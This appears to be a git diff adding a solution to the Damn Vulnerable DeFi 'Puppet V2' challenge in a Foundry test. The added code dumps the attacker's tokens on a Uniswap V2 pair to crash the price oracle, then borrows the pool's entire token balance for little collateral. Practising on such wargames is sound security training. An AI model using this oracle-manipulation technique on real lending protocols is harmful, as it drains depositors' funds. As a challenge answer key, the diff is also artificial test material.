@@ -3,6 +3,7 @@ pragma solidity >=0.8.0;
 
 import {Utilities} from "../../utils/Utilities.sol";
 import "forge-std/Test.sol";
+import "forge-std/console2.sol";
 
 import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {WETH9} from "../../../src/Contracts/WETH9.sol";
@@ -118,7 +119,22 @@ contract PuppetV2 is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
-
+        vm.startPrank(attacker);
+        address[] memory path = new address[](2);
+        path[0] = address(dvt);
+        path[1] = address(weth);
+        dvt.approve(address(uniswapV2Router), ATTACKER_INITIAL_TOKEN_BALANCE);
+        uniswapV2Router.swapExactTokensForTokens(
+            ATTACKER_INITIAL_TOKEN_BALANCE, 
+            0,
+            path,
+            attacker,
+            block.timestamp + 7 days
+        );
+        weth.deposit{value: 20 ether}();
+        weth.approve(address(puppetV2Pool), 29496494833197321980);
+        puppetV2Pool.borrow(POOL_INITIAL_TOKEN_BALANCE);
+        vm.stopPrank();
         /** EXPLOIT END **/
         validation();
     }
